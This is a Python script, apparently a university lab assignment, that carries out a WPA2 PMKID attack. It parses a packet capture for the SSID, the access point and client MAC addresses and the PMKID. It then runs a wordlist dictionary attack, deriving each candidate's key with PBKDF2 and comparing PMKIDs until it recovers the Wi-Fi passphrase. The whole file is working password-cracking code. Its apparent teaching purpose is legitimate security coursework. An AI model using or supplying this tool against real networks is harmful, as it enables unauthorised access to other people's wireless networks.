#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Find the PMKID in the pcap file and trying to find the passphrase with it

Trouver le SSID, l'adresse MAC de l'AP et de la STA, ainsi que le PMKID dans
les paquets du fichier PMKID_handshake.pcap puis tenter de trouver la passphrase
à partir de ces attributs et comparer le PMKID calculé avec celui trouvé
"""

__author__      = "Michaël da Silva, Nenad Rajic"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__   	= "GPL"
__version__   	= "1.0"
__email__     	= "michael.dasilva@heig-vd.ch, nenad.rajic@heig-vd.ch"
__status__     	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

passphrases = "wordlist.txt"

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")

# Get the values of the beacon frame, the handshake 1, and the PMKID inside the handshake 1
beaconF = wpa[0]
hs_1    = wpa[145]
PMKID   = b2a_hex(hs_1.load[-16:])

# Important parameters for key derivation
A       = "PMK Name" #this string is used in the pseudo-random function

# We get the SSID in the beacon frame
ssid    = beaconF.info.decode()

# we delete the character ":" in the AP and Client mac address to convert them into byte
APmac       = a2b_hex(str.replace(hs_1.addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(hs_1.addr1, ":", ""))

print ("\n\nValues used for PMKID attack")
print ("============================")
print ("SSID: \t\t",ssid)
print ("AP Mac: \t",b2a_hex(APmac))
print ("Client Mac: \t",b2a_hex(Clientmac))
print("PMKID: \t\t", str(PMKID))
print("\n\nTrying some passphrase...\n\n")

ssid = str.encode(ssid)

with open(passphrases) as file:
    for passphrase in file:
        result = "PassPhrase not found !"
        passphrase = passphrase.replace("\n","") # Supression du retour à la ligne à la fin d'une ligne

        # Calcul des 4096 tour pour obtenir le PMK
        passphrase = str.encode(passphrase)
        pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)

        # Calcul du PMKID à partir des attributs trouvés
        pmkid = hmac.new(pmk, str.encode(A) + APmac + Clientmac, hashlib.sha1)

        print("Passphrase tested: " + passphrase.decode())
        print("=============================")
        print("PMKID found:\t\t", PMKID.decode())
        print("PMKID calculated:\t", pmkid.hexdigest())
        print("\n\n")

        # Test du PMKID calculé avec le PMKID trouvé
        if pmkid.hexdigest().encode()[:-8] == PMKID:        
            result = passphrase.decode()
            break
    print("PassPhrase founded ? : ", result)